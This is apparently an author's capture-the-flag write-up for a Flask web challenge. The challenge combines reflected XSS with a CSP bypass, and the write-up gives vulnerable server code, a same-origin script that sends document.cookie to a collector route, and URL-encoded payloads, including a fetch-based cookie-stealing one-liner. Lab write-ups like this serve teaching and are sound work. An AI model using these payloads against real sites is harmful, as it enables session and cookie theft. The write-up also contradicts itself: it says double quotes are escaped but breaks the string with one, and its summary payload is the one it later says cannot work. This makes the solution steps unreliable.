# XSS\_CSP – Personalised Write‑up

**Category:** Web – 150 pts
**Flag:** `flag{xss_csp}`

---


## Challenge Flow

1. The application only has a single point of `GET /?q=<value>`
2. Using `/?q=test` prints test on the page and in the console, showing q lands inside a `<script>` block
3. Looking at the code shows it only escapes `& < > "` so we can break the JS string with `";` because the single quote is still allowed
4. The server also sends `default-src 'self'; script-src 'self'` so inline code is blocked but we can load a new `<script src=...>` from the same origin, pointing it at **/c**
5. Build the payload of  `";</script><script src=/c?c='+document.cookie></script>` then URL‑encode it and call `/?q=%22%3B%3C/script%3E<script%20src=/c?c='+document.cookie></script>`
6. Visiting that URL sends a request to **/c?c=flag{xss\_csp}** and the server reveals the flag{xss_csp}

---









## How Difficulty Was Increased and Defense Mechanisms

I increased the difficulty that blocked the obvious script injections by using manual html escaping, this forces the solver to actually look at the website precisely. I also increased the difficulty by adding a chain of different elements that forced solvers to use string‑break, CSP bypass,  same‑origin script instead of using a one-liner.






## Indepth Build and Solution Notes

### Build Section

This CTF challenge is a tiny flask web app with 3 routes of 
- 
**What it is.**
A tiny Flask app with three routes: 
- `GET /` — renders a search page and inlines the user’s `q` value inside a `<script>` block.
- `GET /admin` — sets the flag as a cookie: `flag=flag{xss_csp}; Path=/; Secure`
- `GET /c` — “collector” that logs whatever arrives in the c query param to the server console.

Each response adds a `Content-Security-Policy: default-src 'self'; script-src 'self'`. This is because it blocks incline scripts and allows external scripts. 





**CSP.**
Every response adds `Content-Security-Policy: default-src 'self'; script-src 'self'`.
This **blocks inline scripts** (no `'unsafe-inline'`), but **allows external scripts** loaded from the same origin.

**Where the bug is.**

* The page escapes `q` **for the input value** via `safe = ...replace(...)`, but then **injects raw `q` into JavaScript**:

  ```python
  "<script>"
    "let query = \"" + q + "\";"
    "console.log('User searched:', query);"
  "</script>"
  ```

  Because only `& < > "` were escaped (for HTML), the JavaScript string can be **broken** with `"` (double‑quote) and a `;`. Example raw payload fragment: `";alert(1)//`.

* However, CSP forbids inline execution, so a one‑liner `alert(1)` **won’t run**. We must:

  1. **Break the JS string**, then **break out of the inline `<script>`**, and
  2. **Inject a new external `<script src=...>`** that the CSP will allow (same origin).

**Cookie/transport detail.**
`/admin` marks the cookie **Secure** → browsers only send it over **HTTPS**. For a realistic challenge, you should run Flask with TLS:

```python
app.run(host="0.0.0.0", port=5000, debug=True, ssl_context="adhoc")
```

(If you can’t use HTTPS locally, drop `; Secure` temporarily during testing, but keep it for the challenge.)

**External helper (recommended).**
Expose a same‑origin script that exfiltrates cookies using a benign request (allowed by CSP):

```python
@app.route("/x.js")
def xjs():
    return (
        "new Image().src='/c?c='+encodeURIComponent(document.cookie);",
        200,
        {"Content-Type": "application/javascript"},
    )
```

*Why this design increases difficulty.*

* The **manual HTML escaping** hides obvious HTML‑context XSS but leaves a **JS‑string context** open.
* **CSP** removes inline execution paths, forcing solvers to understand **context switches** (JS string → HTML end‑script → external script) and **same‑origin policy**.
* Marking the cookie **Secure** forces correct **transport** (HTTPS) or a conscious testing change.

---

### Solution Section

**Goal:** Read the `flag` cookie and send it to `/c` so it appears in server logs (`Stolen: ...`).

#### 0) Prep

* Run the server with TLS so Secure cookies work:

  ```python
  app.run(host="0.0.0.0", port=5000, debug=True, ssl_context="adhoc")
  ```
* Visit **`https://127.0.0.1:5000/admin`** to set the cookie (allow the self‑signed cert warning).

#### 1) Plan the injection

* Context is **inside** `let query = "<HERE>";` → break the string with `"` then `;`.
* Close the current `<script>` with `</script>`.
* Insert an **external** `<script src="/x.js"></script>` (CSP allows `'self'`).
* The external `/x.js` runs and executes:

  ```js
  new Image().src='/c?c='+encodeURIComponent(document.cookie);
  ```

  which issues a GET to `/c?c=<cookie>`, and the server prints `Stolen: ...`.

#### 2) Payload (URL‑encoded)

```
/?q=%22%3B%3C%2Fscript%3E%3Cscript%20src%3D%2Fx.js%3E%3C%2Fscript%3E
```

**Decoded payload** (for understanding):

```html
";</script><script src=/x.js></script>
```

#### 3) Execute and observe

* Visit: **`https://127.0.0.1:5000/?q=%22%3B%3C%2Fscript%3E%3Cscript%20src%3D%2Fx.js%3E%3C%2Fscript%3E`**
* Server console log shows:

  ```
  Stolen: flag{xss_csp}
  ```

---

#### Why simpler payloads failed

* **Inline JS** like `";fetch('/c?c='+document.cookie)//` is **blocked by CSP** (`script-src 'self'`).
* A raw `<script src="/c?c='+document.cookie">` **doesn’t evaluate** `'+document.cookie'` (it’s an HTML attribute, not JS). You need **actual script execution** to compute `document.cookie` and build the URL.
* Using **HTTPS** matters because the cookie is **Secure**; over HTTP, the browser may not set/send it, and you’ll see nothing in `/c`.

---

#### Alternative demo modes (for local testing only)

* **Temporarily drop `Secure`** on the cookie:

  ```python
  resp.headers['Set-Cookie'] = "flag=" + FLAG + "; Path=/"
  ```

  (Works over HTTP, but less realistic.)

* **Temporarily allow inline** (faster, less realistic):

  ```python
  resp.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline'"
  ```

  Then a one‑liner like:

  ```
  /?q=%22%3Bfetch('/c?c='%2Bdocument.cookie)//
  ```

  will work. Restore CSP afterward.







---

## Related & Future Variants

- Stored XSS where the script is permanently stored on the vulnerable web server, often in a database, this can combine with sqli
- DOM-based XSS where the attack occurs entirely within the client-side code.


---

### Sources

* **MDN – Content Security Policy** https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
* **PortSwigger – DOM‑based XSS** https://portswigger.net/web-security/cross-site-scripting/dom-based
* **PayloadsAllTheThings – XSS** https://github.com/swisskyrepo/PayloadsAllTheThings#xss-cross-site-scripting
